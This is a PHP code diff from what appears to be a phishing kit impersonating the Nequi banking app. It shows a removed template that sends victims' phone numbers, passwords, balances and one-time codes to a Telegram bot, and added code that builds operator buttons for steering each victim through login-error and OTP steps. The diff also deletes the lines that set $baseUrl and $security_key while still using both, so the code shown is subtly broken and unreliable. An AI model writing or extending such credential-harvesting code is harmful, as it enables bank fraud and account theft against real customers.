@@ -36,28 +36,30 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Enviar datos a Telegram
         $botToken = $config['botToken'];
         $chatId = $config['chatId'];
-        $baseUrl = $config['baseUrl'];
-        $security_key = $config['security_key'];
+        // Ajustar URL para usar el script específico de Nequi
+        // Si baseUrl apunta al root o al script global, intentamos construir la ruta correcta
+        // Asumimos que baseUrl en config puede ser algo como 'https://dominio.com/updatetele.php' o 'https://dominio.com'
 
-        $message = "🔐 <b>Nuevo inicio de sesión (Nequi)</b>\n\n"
-            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
-            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
-            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
-            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
-            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>";
+        $nequiBaseUrl = $baseUrl;
+        if (strpos($baseUrl, 'updatetele.php') !== false) {
+            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
+        } else {
+            // Si es solo el dominio, agregamos la ruta
+            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
+        }
 
         $keyboard = [
             'inline_keyboard' => [
                 [
-                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
-                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
+                    ['text' => 'Error Login', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=2&key=$security_key"],
+                    ['text' => 'Datos', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=6&key=$security_key"]
                 ],
                 [
-                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
-                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
+                    ['text' => 'Otp', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=3&key=$security_key"],
+                    ['text' => 'Otp Error', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=4&key=$security_key"]
                 ],
                 [
-                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
+                    ['text' => 'Finalizar', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=0&key=$security_key"]
                 ]
             ]
         ];
